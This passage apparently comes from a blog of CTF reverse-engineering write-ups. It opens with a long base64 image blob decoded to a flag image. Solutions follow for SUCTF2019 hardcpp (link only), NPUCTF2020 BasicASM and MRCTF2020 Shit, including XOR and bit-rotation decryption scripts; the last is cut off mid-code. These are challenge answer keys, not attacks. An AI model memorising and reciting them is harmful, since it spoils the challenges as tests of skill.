+k00YfuwmTGj/htRjONgvZS5IMDMf1KDlTKf5E5NSm9HImzwUKLAt3ExdLYbtJI4orhviCmXSfAGE0xUJwbA6BAU5rR7I9yl4lDSLat0jkycooR4LBUTVyWqFusem9LPjVQCJo0qcrmyT+6KQEGjHtfCVHlDYJTfSkhj9AitAoLI92VEwFw9200XjitrlkUgnWSI/jjsxEPLegg7OvgwqJnp/srFpi0Oev4tv+YRKggCCFxq0twy03Juh4EY6nOk0bcCvHOGhNJOZm9z28DZwAiRqBbmFouzzBJajSR51jHhE5M+54MU0okf8A41FAYr9B1paaswKi/nF0l7lsz7R4RNRuJi25bVuRbwgfmmwHA4So82li4dMClYLUX2JnpFZeFGsgiDm501jF7qpYARhIuPmstTCzeWDE6lunhyMJI1k42BP0wpyLBemjzUuIyYjTOA065Hscevhs6A3OK5aG60yu/kv4nms08ywN+iY1KFcLs7nhSoLIsBGLTOyfOsPsKXzaVzo2Y0GP0pqbmSZEf54NGqtdOQUVwMU8dfmaZecwpllb6t2rs0xbmyZeAmaOymHAq5u5d7Cb0izPnUtHCc30jufNYi77Jd+fvQkSNm4/uaEtLvRUmMVMLb82l88log0LiYlZCCltNv6osHXW/tk9KEBIJnX9LZKLYtMFcSQu0C9FStgJ5BlV7HxCtS6+fzTORSgBx91w6VyPlX1f2oXBQWDXNWZsge1p9e+a+v8AzVoSyEt0rGggsz4rSkgR6Jo7dNPXF6UoZUspf8NP4Cf/AJYMHIZxFbJJYBCxMxiUaKJL3jvRS0KsxGXKh5MxEKrxlrBYrvxttiAb0EouEMTtwtwRVsgDdYNqmy+cJAaEjad28RTrjgYGJ9krpPTEUhYLFK6Kr5Kh0JKG4ZMxtnUViXCbBAmbKtGOhs0hz0U/8YarMAU4kEiDCbwBRMLp7rA7R1PLChahk/lA0UQEF0FRuYDDtDq9JKYikLBYqcLWvgLCLincLkNq7BG9X+F6b3vLCJiItnwtXJi+ZdINp4W47MYcsQLH0Kc4+LGDMWHHhbP1w4irgaHauklMRSFgsVDYEZXMyFjac9S+leslcGJN8vAtl6TapBZprwasAvijHlRC+yaCC4iwyTuBwjwBM6WUq0MzWYjFgAdKZ+db2o5DFhV+bt4gVgBYYFaFxtZkEepT+b1wVJZuJrQsC4vV/im/l5UxLGra+xXd0oakzKTS2w1jZrDbLyOAa7H7UVEyHnDwIDlruOOsFS+HZj8RV31Kb3qJoaKNeAS4B3oHWlRkFKjK8JlJulQk5cH0Xx3NCVgLGH0GOjzxvp091S6YaAkfRwp7p7Ok7vBCOPTAxyNzeM858rFR34hI2Jq5k/fKpUZxBrczxr63Tw+9jXrTRRpiQTDJoCRYBqY3IwE0HDhxGwRmWxjYozPHMPYLHSu7pYAOVh2mLyIpPMsQClaxRV9eEa7H7V3TgiaV7JkixfGiBSFpl1OSu+pLliJDmDj7FHCQnrOxwHMAAk7VP/kdU1M6Uu0v24D6HE6il1D6mA9NS2FhpNPvqQjljwFCelIWBVxYRwQg7ZuM8tJgNkps8aqKFJnNcwjd8pVeR1S0wMQa1ars1/B9iEUDoV9bp4fexrtG8jMS96ZXBvF45jC4tSoDVfqJsIiSUWOOJEBtlRFd3Sw/m84pkOlXi/IDWUIdVAAybwDXY/akI3Qc5+B37o7wLjSoUg1CqY6FXfUgPQ31Ie2llNJSAJOhVWm1nd4w+KqTIImpTTE9KWvAD4QRZoF8KtIcA4AnNvKgGrYTZh3r31LEAkTEX2ufFDOOm5XswYYXO8U4wIQtwJYbhWdvKWKJjZiNgE51F+fAxSLlC89qaHDsgapsGa1dkYkyWHejH3LOPU4n6FzhejacrTUAETW/ANC/wUwFuRIPukctjREDhSSdr6i0pSEKsAFA7wkF7fy5KgvkfkDgjRfi9KARZxiW9D7/AO+gFIDXkru6SKFoMu+XgR4sggigbEqOwrIzP2XMZpbpJf6IBRywKa/2uBXRApJDnVdCu2r8h809dtsgCV1kYB2i9HFDLVdLcHlQaCIbU6YA2RoGWkXDvcdlL6PBo1AJXxieGGD6RIEottaiZwrK+oYMa+5tkAjK1qfftyfEkE6PC06UxJHMkXKM6n2iQEIAmK4Q1vHREbyVxu1pA3HYmVYcDewbnYIlxo2GIBfqHrNHnuBF0wDZU4S29Y3sBJ2RSNm4/wArVPjw5+63a3joiN5K43an/NecImVYUKtRBRAQJJ4v38Jid4ra6hIGyFhs1BtTlbyF6tXZl2fs3GLhQE3owIlm6JWZOFrKMtaZHO44LYlRgrjG+Z202tSG1GUtYIsq4cLZ2ExqKE4lOpQZEJkgMwMux4aZehfhEqZzyWmjHojqnZgQmEL1KGNxHSyQZhdpRJAZ635eRBnAwpzPDy/IAvGJgRLV266XF9LkAmj5ySQEQSYm95m/iBhrBBmkHiTEWEFRhdJxa08yF6SL4eLPOhlQElEalAfhALAAAAAAAyqTNHBXhvCWUMV/xf8A/9oADAMBAAIAAwAAABCSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSQCK06SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS5vZuhpuqSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSfiyr+7CLKSSSSSSSSSSSSSSSSSSSSSSSSSSSSQKxkgEmEiAZKSSSSSSSSSSSSSSSSSSSSSSSSSSSRTwkkkkkk/D2SSSSSSSSSSSSSSSSSSSSSSSSSSQjJkkkkkkkkkJSSSSSSSSSSSSSSSSSSSSSSSSSSR7Ekkkkkkkkn6aSSSSSSSSSSSSSSSSSSSSSSSSST4kkkkkkkkkm8aSSSSSSSSSSSSSSSSSSSSSSSSSQ0kkkkkkkkkvdOSSSSSSSSSSSSSSSSSSSSSSSSTspkkkkkkkk3npSSSSSSSSSSSSSSSSSSSSSSSSSQHokkkkkkkkbgOSSSSSSSSSSSSSSSSSSSSSSSSSR/kkkkkkkm8pSSSASSSQCSSACSSSSSSSSSSSSSSREEkkkkkk8aOSSSSCSSCASQSSSSSSSSSSSSSSSSTQkkkkkkRBySSSQSCSSSASSCCCSSSSSSSSSSSSSQ4kkkkkl2VSSSSCSASQSASCSCSSSSSSSSSSSSSSRekkkkkkPKOSSSAAQSCQSSACCCSSSSSSSSSSSSSSwkkkkk14d+SSSQQCSSCCSQCSSSSSSSSSSSSSSSSNEkkmk0N1GiCSSSSSSSSSSSSSSSSSSSSSSSSSSQ8m0kkkkknUdSSSSSSSSSSSSSSSSSSSSSSSSSSSRg4kkkkkklmzmmSSSSSSSSSSSSSSSSSSSSSSSSSQYikkkkkkkk22TySSSSSSSSSSSSSSSSSSSSSSSSSAYkkkkkkkkl38KSSSSSSSSSSSSSSSSSSSSSSSSSQhkkkkkkkkkk2qSSSSSSSSSSSSSSSSSSSSSSSSSRJYkkkkkkkkkUOSSSSSSSSSSSSSSSSSSSSSSSSSQWQkkkkkkkkvmOSSSSSSSSSSSSSSSSSSSSSSSSSSaPx8m2k0kn12SSSSSSSSSSSSSSSSSSSSSSSSSSSQIdUkmkkk83CSSSSSSSSSSSSSSSSSSSSSSSSSSSSYOSXX+zEYLSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSdq5JmNWSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSaSUDrSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSTbaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSQSSCCQSCAASQCQCASSSSSSSSSSSSSSSSSSSSQSSCQAQAACQASSCAACQSSSSSSSSSSSSSSSSSSSSSQCSQSSSASSCAQCAQCASSSSSSSSSSSSSSSSSSSSSCSSAQSCACCAACQAACASSSSSSSSSSSSSSSSSSSSQQQSSQSSASSQSCSSCSCSSSSSSSSSSSSSSSSSSSSSAQSSQCSCQQAAAAQSCSSSSSSSSSSSSQCASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSQCSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSST//xAAgEQEAAgICAwEBAQAAAAAAAAABABEhMRBQMEBBYGGQ/9oACAEDAQE/EP8AOGpTKZT+GYaTg3bg9w3yfxn8p8iK1F04R3Zh+ApYrtnyYfBAGJbfDExLzJLHhCqlDZFDXe3cY3ABZAGuaPEiEailkcYl9y5j5sKADz04TtiVXb6mUexh+mGcxVout9sz6YbEHp6huY7UhjtcERiQKlemQNykRZ7XJMofUZVi4E3HafZYxAITKHoH4lMQM8K31F+pXaOJXSkekMQpbAj5S2JXa5uIGT6KQ7EqUm1dzm9LQ3S9Qxtz3QqSChXmYbhFsGwMWyzfdjCHHy4FzUmFiLt73RNXkZapauuNp2lzfd6Jo8uomAwsyPJ7tZJX35qIFcGal7Y4YVZ7liy2j6KRqA1M1kXeOO3yiMIqQPQUcIO4bQRbZNh2ypdIZr1NIgRmahrqJXbBQwaWeq53FvkAsS1Xamum29cmmc7VzGQjBPUKoneBiQ7Uix80zXp0EVUmXc13DAXwLTZMEx5ftCjUUtee5cwhFASlmUvyLUAVcVURtXNd4I1GsspU8YAvhbLS0tloptGYpmMZTaP4EeAbCK3PqcgVDaivCOm/w1pP7T+0t/00/8QALBEBAAICAAUCBQQDAQAAAAAAAQARITFBUFFhcTBAgZGxweFgodHwEJDxIP/aAAgBAgEBPxD/AFwXKdZ3p3oJpln6FBScih3jKsOjcAvzEAtrxiNFXzneTvPnL8OUPzBctgnuY/EFKC7ypHwYcBApVufJGoN3FCAilMNQ445R4LKcGY6THSUcSX0SxxxjJApRDvPMAQy4j0+/PIhhAq2L+zEto9qJNr9Jdf5CcMPWP2QW7JEDuItE5zxmPy3wdo6buAR6xhiOASioP2Iv3hjYc42yio5ft+YuRvqxbfZHXpIQFpNLKZKPNReUdodB94gN5ZUA9mYU6gZ6SCS/eIab5q6dAu4hLXB49oRu8e8xfGcQdgZ5oZlocX7f3MYfaDzM0VxkvvUFFB2iG2+ZhROHCLF+2Wy1ly+wbdyqbjYlwBT1YZp7q+krI2y+ZhFgM4fCWHGYNz2NjW5fV8pVZdg/mGqwm3hXHmo3DTYGTzFv2DLrSIlLT4h/CAV9eMVd84ePBi5NmD5+wC2Ki+CfSQMoFaqVwPOXfAFYvfH6+q5XFpUK3z2huCYahE3gRDBzv+iNM+JH6x9QFJuXIPLhD9HqzdNTHUedl/SaYnyH6+qKyDQNskMA9Bg5Fj0gLDOznZNqyvd36+qI7Isi3VRlPmhKi3C4MHTnashEeFJjv1RGpdwRpgNcsDZ33AJm/nFm4owwObgu3SE5p9MR9g0M3MF00RsqdX/MOmTtN05vYV6wjF5T7/aI6NM031xrUW9wLTAWxgtKeYHFK9oHjAoVR5orxNXaJFFMLczCPsgtQDZSAkd6Bc3wgG1ZzXc4Ir9oo9mW/wCLYEQVLFu/C7YeHNCBnaKgU5aie2YR1xc8AvzzUavG528Ho/mYwVualBv2dwmF7FpDQ5fsfmUMearYhVUpox3DTyPsiFRuXkFkuaBLrLzYRqCLMIoKYevmKE1czxLleqNcCCLrAgHhE15/iCTnnCXqHUIrHfBrMOK4epIY+muJAdnUwGl1IuFiFGXnQ1qOcsonYwUTdNR63sRbP8EUc4gS2LS0tCi4rpL7TC9MeIBdun5/iBig6RKsirvn2oyxdEZLcTEfUf72g6LwjaHwE/4E/wCBKBR8IWJeWIsfLwgCu+YQAAj+gUY1FXf/ALCtJULf6KuXLl/65f/EACwQAQABAwMDBAICAwEBAQAAAAERACExQVFhEHGRQFCBoSCxMPDB0eFgcJD/2gAIAQEAAT8Q/wDzenvUbK4fwbRocngrhqdT/wDBpIUq+ksMVczsmHiHgKkVnMfsFLpJozWtf0oXct/eSnWIc/a5Li1HD/mZVQH7+ZQ/ZSx7zHfqC4K/YGKNCvmrj77DX7dSvkKOJ8ramNQayeJFYqFEBgCApJxU8VOkVer9F2iSmL2mv8cPM36Ktzd8QH3eSkigAXO8qEX97SPmkWhkLCj3dTQpsJIF4fYUIsfhFQVBUFQdYqDoUB30GlX81jTLx0LBwt2pWqNFp94EtCcYk8Az6f4y2SNO61qIbHFQbVBt/K2o1FwEibI0I3Lx91+jTarXGQe7srXfUo6KiL12vAWzWtEFQ41GoNv54Nqg2qCgCAjZmhxBf1oG/k0p9zQ3x7qUwU7UhlsaRzeieSpAGS8tBeU9HFCYIQhIm1Tn+ykbAYyC7jUpiz3Um16yxgUGbX3xof8AlXqD0ipUzeioDxA2HLI3pI18k0+6AkqbN8HT6bfd7UDIelh2Gn9SVnTNQfY5W4qbAR4WwwHalTK59zmwRR4jZkoPuiLA1Im+8rtQehFiN6VzUrUqbtd/vCaIpENgb/51KXNIvukXmpmj4nB+TJ+WtIq5Z9FBVF8uAcvC9JRiJNwmO7epaE+Paq6ULRSMw+62pGvsmjk/tt6LWYolVWd3mi8Kl2kl8AbTy02r8loQN+YSwd6sJdDThpXe/Agz+wVoD+OCGAM0cJBpf5HxUkdiidi00sHJdyocnJb8uABYQAur9MqDJIyduRJ9eXG9DdHVAMnKwbegjt68lO/WpojFhv0Y8F6TLsmS3Vq/5AADFJDcORY1aMmJOH5A7K7C9BJWCQbI2aSGQCWtxMAsYAvUAMdbiDihODouieZmGggLwEA2DSp04fQfZiEjlao6vpmNzqXvwKB67aLfawaF6Yod1DUkeCo7Hihio4kRUu8NXWBQjMjtAyc7vXCWD+YQ8tXcgBKR/wCXFXoZqQQG4bBUx/G3S/qVCuxL+tPirAlFS7/m7rfy98Pf8xtUGxv1LBBAitYLALzUt9dQECK/yZj5VG4GSIIwdSaaijZgBZzmQdk/Dns54kelt80NQTMdIKLrFVkuhtAjcKPEB9bIubdOtr/NdC4cseQ+FKXSFTzFeCrEruqXP8II5Sb/AAeS8bPwKzMDyUgtntXHw9RjyXFS55n4HwBjcQvhOuCnKEXIevBtUgbRwHmUCp+tJNKk/l96aDBw67ThoKUWbnd5fFqm2CJGySk7tRGf4BJ++28UNgd3NKhIGTv4WemTaLiYUtkG6vBlBpkiqyrq9RlTZhSRNkSiRZuEEc2axMGa3HQJ8kj51cvBesC4hl6zkHCbdcqNLdmNvlrQ5gtGsG9eMN4UoiY0Go2dEUvrR2NXINn6pGbAl2+1Bt/JdoAzrUIiNkS1J3+yDb4n4ir06WdkXXDXKP4MRehsMQ5v2QcYqZ1f/wAsXmoifsqbj/ZTUUgFsy4DQ0/CXM0n53BmFGBw2rvnMEJcO1HLfKI75VlqC1O4y+XxUu/4I1dJu2TkRSOaMqEq/L08FA1XPrhFviCbworj1h1hV0CAOPXXFzWsthAca936CCEjOaHmcOfZGzQfNgbLf4VNviJn1jZ/dSKvxUM6fiKYcVLvSqyual3/ABl3qXepfzFMLv0l3qVyvrovanmdKySC+PuH8MG3WDb8INqvrV9KgcW4E3JvyFToQ3oeMXxCid0Mv4n/ABT7uCU5KDWA3TnzqtE1M3qDaoNv5YNukErBKytR20j42r/R9mnc+ZqbNBXsEwe1+Km8wq/kSi/JHustK1APKBXmpzNSpTUbkHka0eiQbFZy05nWp5ZkD6l86WpZpwcVz9UvdPCGwR915qPAVZg7M4i7kb1moNvRQbdUh8gSRrDIMN2OBeaKk8QyJGS+9PuipCbgbIkYbUIQrWCcDTA5Rp6SDaoNuhjAAAovBrYBT9dwpGsPbJ3vn3Uhcya1D9wwHdja4HI2oE9Z4g+DWKmfRy4oLIBA5S6FK+F3ZLd1Y0c0zr7reachNTq+pf8A6dOtA5KL1NxuG/owGxSSG4Vo2+KcTy9tj4qbK3q69vdprWaK+WpUfgLUw0X04Y+QLvUx/PctUsQgm9K0WSCUfsnlVJ6l95lnFE5C7ZrOCKNkxT2TRr4grhWQ944U0GWgMifhBVuKtxUm/SD8QRqwRwb+YOaahr8d8PA22mk2q8zHvUu9c1JiGShNxNaUXiopyv8A3qSeEgNif2qg4whk7EUqdGtL1BUFQVB0L5tTFKMhgK+7oWoDfgpFGOgt8fzqZoCW1S4rASti/v4h1vtQZQXEYirZAFbO0JfBUMkN2btZo1k2JJuWFTEDcue4Ceeo4Y3oQ9x3Z4pcMMc83hUSiyY8r7pqLoZh5H8iptOEO3Vu0rM1K65/8DLv17akYnM1Pdqe7XIzMzN53pTmaVctS4lqX/6oVfLu8scJDNgLgKAsSVcCLzN5ZUmmYOBIGWiGEmEDQh5UkYppD5TKJgA6U04AuKNkKTsCIgW6U4SDuXsqlJdRNoaAICeJLOWQYAIrhe6cYSBOKTADipjlPHNBLETEsqqEgluSfdHPJDmiSlESZQImGPUYTH+7euvdxUTSa0ZJfhe7ZqcAsbiVjiWxgLgpJXA2u02WAzYEoGXCWuzKETn0vmKN+e9MjM0LhsCwOJORiiYJTxzQSxExLKq3myN4hCQXQDzTDQmYAUAlLAATYKDuhE3DxQ+GV3RSE4IhFIWnRYkSFnpTmngr4jSWSA4TCjD2ADCkEk6qIIi/SnLptsbmCODBfErUwSnjmgliJiWVVjkwx3nAoBYvBmpI4GCQq250TaV9gQhkEm4uyuc/U6S2d3kMAWfaomAPmCrysr3qeoYYs4MXluAPRkJCCJwCIECFsStKPZmKtxEuAHFEzocB7lUDQTN6YO12XXtkWxicy05SPTAGcZKQhem3sKJ7weAbCdZKUdhXYU/p4pI/BiQc4LBhKBgOkYK0kgGbwoUQS7akAgI2RocYPdgj9dPv9jsoagJpaBX4Zdw6LQUkrt9zcOsFE4V8Xkyf0S9CxnITkBYcIz4qb6O4GSV1c+RUsRkDQNVVV56WTm3pJ+6x81CWRISnR9M8fbjPoVG0X0uhrcPkooCKxhA57Tju9KwnjW1yCaTYxI2k5SdDYQABKBLiOtD8o2tkU3WWe/tbpIUUl3wCneKLl41/z/rTjpLPAECCyYJjB+G7DVsohzGokLg0Wsnv8IGBaCBuigSxiI8XJiwmCYqGgF6ENtdV9MaLvuIljqSEiTLcoKL21ty4sNHUA0YlD99Pv9js69GWIfUUBIN2lRt79UcEGU5az0LLZpMuAgdlk7G1N4I+p9Be/HPShPPCUUTxCmjMMjG127BTwqunRzz/AJ6EjDo5GUz5W/NCKaC7C6x/aSuZi4Hb4Z89C2eP2IXcKT5rC1RcELGrHTO0OTiSgk2UjKtymbzWAPdFEMDYsL7QJBAjIi40TueR4pQxjDQGQ+PxRs7Fq4kqwAEv4bsNS0M29LKCYUua1dnJzpMAIYAl9KW2wQ0WEgKJJssJRwWpJQY5ESYVJYlqNiCAnAwaDNwN6LBhBiRSKEEgwkkU80vDGX9J0v8A9jsorAKTmzeB6LI1NoQhXQ0fzYrhcYuW5hehZTxBYY99rH/VK8hGAbf8dRQiICOlAaqLDdAR80JYaGEJHxQtKcnAX+KDsUYTyfIgo+KO1rtiUCbAhHIm0szUfkrY5vBHPQtHdKySgA0B+R/PTO4xYIWgTEpGCjEwXHzURFuE2SMAErb2hLDYKeYbnsJDIgL55+Wi3nLAwg3KNup0MPMQGUACtak6dB5awxmmC71BZNEqfq1MEJv+H6SQsoWJBQ0UiextRL09DIueAfFfcrIwbBef+ejj1h+XAkBm4SQGNmFEBjZZ50UYYhasAMGuq4AMtX1t8OAEcCpmME0F7QJqQLIiImanKGLnB7CS2ZwRUzPgY1kYCTGQmfSMy0aILsOinPMkzc1XvEZKM19IKUzN0DpDERpQppeTBo+egJ7NRpJKWoDYaipgiSpJOfqmakdDMdkSnAp34Lk6Eyf+uufAgMtDy+T2os6s1udM+8JMMSUUsaGTcSXYnFMf3AvAhRBF6FlemHt7c7WoBKV1WsMkOtMa5voi0Sy8/wC9ycaKcpgj/sqKQCoHnpE+CRiTNi7WUiUDcRK3COkXYQYVAjyPI5oJciJggAJHmXJm5AuSFTjotPbwkrgDcREo0dBEhF5nrLXNW8joiRQCxu8ta3QoFCEe4pF4WZdWbJLQcNQYJbgOyVZ4S98Je2ACWwBpXkeRzQS5ETBAAERzanEgTZCpxTWYEjMBqs35qB8RCwZr202eNCooZNncdEsRMQyKUxVtYJMWNTlGkbJsdKpduoF8UASJBB4YxDdEYkEqlwrjPvXnnSNl5L36UmRMQwVl0sCYsAAEKeImNu2WKb3UDpSo/Y1tQUQRAgi0GwOdJxdkI14WbwPpVBGXqV1ABIJMBV4fWsW85hyCTcpisESFCRAAlAlaJL0Uc20SgRkDKLF3VSgLSRxmJKgT88gYOu8YZqW5nW8GQwBCUyA9PGB1YxiBSItEepNLjDFEBMIJmJd6SqQcL1SxAqxOr6ecbOtm2eSQnmgwlF7AkxgAAFGvCx7dJJyxIgg/8X//2Q==&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;s.jpeg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211018181215405.png" alt="image-20211018181215405"></p><h3 id="SUCTF2019-hardcpp"><a href="#SUCTF2019-hardcpp" class="headerlink" title="[SUCTF2019]hardcpp"></a>[SUCTF2019]hardcpp</h3><p><a href="https://lantern.cool/wp-games-2019suctf/">2019 SUCTF | Lantern’s 小站</a></p><h3 id="NPUCTF2020-BasicASM"><a href="#NPUCTF2020-BasicASM" class="headerlink" title="[NPUCTF2020]BasicASM"></a>[NPUCTF2020]BasicASM</h3><p>根据分析主要就干了如下操作(python实现)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	<span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i] ^ <span class="number">0x42</span>)[<span class="number">2</span>:])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">hex</span>(flag[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d&quot;</span>)</span><br><span class="line">flag = []</span><br><span class="line">sign = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">        flag.append(i)</span><br><span class="line">        sign = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(i ^ <span class="number">0x42</span>)</span><br><span class="line">        sign = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Shit"><a href="#MRCTF2020-Shit" class="headerlink" title="[MRCTF2020]Shit"></a>[MRCTF2020]Shit</h3><p>既然给了源码，那就偷下懒吧, 看到decode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k=<span class="number">0</span>,bk=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">5</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		<span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">			ks[i]^=ks[i<span class="number">-1</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i+=<span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		k=ks[i/<span class="number">4</span>];</span><br><span class="line">		k=(<span class="number">1</span>&lt;&lt;key[i/<span class="number">4</span>])^k;</span><br><span class="line">		k=((k&gt;&gt;<span class="number">16</span>)) | ((~(k&lt;&lt;<span class="number">16</span>))&amp;<span class="number">0xffff0000</span>);</span><br><span class="line">		k=((k&lt;&lt;key[i/<span class="number">4</span>])) | (k&gt;&gt;(<span class="number">32</span>-key[i/<span class="number">4</span>]));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>,k);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中key为生成出来的，直接写个程序跑一下genKey即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">100</span>],c=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> key[<span class="number">7</span>]=&#123;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;w&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">20</span>,keylen=<span class="number">6</span>,maxium=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> before;</span><br><span class="line">	<span class="built_in">map</span>[<span class="number">0</span>]=<span class="number">2</span>;c--;</span><br><span class="line">	key[<span class="number">0</span>]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	key[<span class="number">1</span>]=<span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">	key[<span class="number">2</span>]=<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">	key[<span class="number">3</span>]=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">	key[<span class="number">4</span>]=<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">	key[<span class="number">5</span>]=<span class="string">&#x27;z&#x27;</span>;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">map</span>[i]=<span class="built_in">map</span>[i<span class="number">-1</span>]+rand()%<span class="number">5</span>;</span><br><span class="line">		maxium=maxium&gt;<span class="built_in">map</span>[i]?maxium:<span class="built_in">map</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	before=time(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;keylen;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> step=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">long</span> <span class="keyword">long</span> t=time(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">int</span> delta=t-before;</span><br><span class="line">		<span class="keyword">if</span>(delta&gt;maxium)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=len;j++)</span><br><span class="line">			<span class="keyword">if</span>(delta&lt;=<span class="built_in">map</span>[j])</span><br><span class="line">			&#123;</span><br><span class="line">				step=<span class="built_in">map</span>[j];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		key[i]=(key[i]*c+step+i*<span class="number">3</span>)%<span class="number">32</span>;</span><br><span class="line">		before=t;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ks = [<span class="number">0x8c2c133a</span>, <span class="number">0xf74cb3f6</span>, <span class="number">0xfedfa6f2</span>, <span class="number">0xab293e3b</span>, <span class="number">0x26cf8a2a</span>, <span class="number">0x88a1f279</span>]</span><br><span class="line">key = [<span class="number">0x03</span>,<span class="number">0x10</span>,<span class="number">0x0d</span>,<span class="number">0x04</span>,<span class="number">0x13</span>,<span class="number">0x0b</span>]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">bk = <span class="number">0</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    ks[i] ^= ks[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">4</span>):</span><br><span class="line">    k = ks[i//<span class="number">4</span>]</span><br><span class="line">    k = (<span class="number">1</span> &lt;&lt; key[i//<span class="number">4</span>]) ^ k</span><br><span 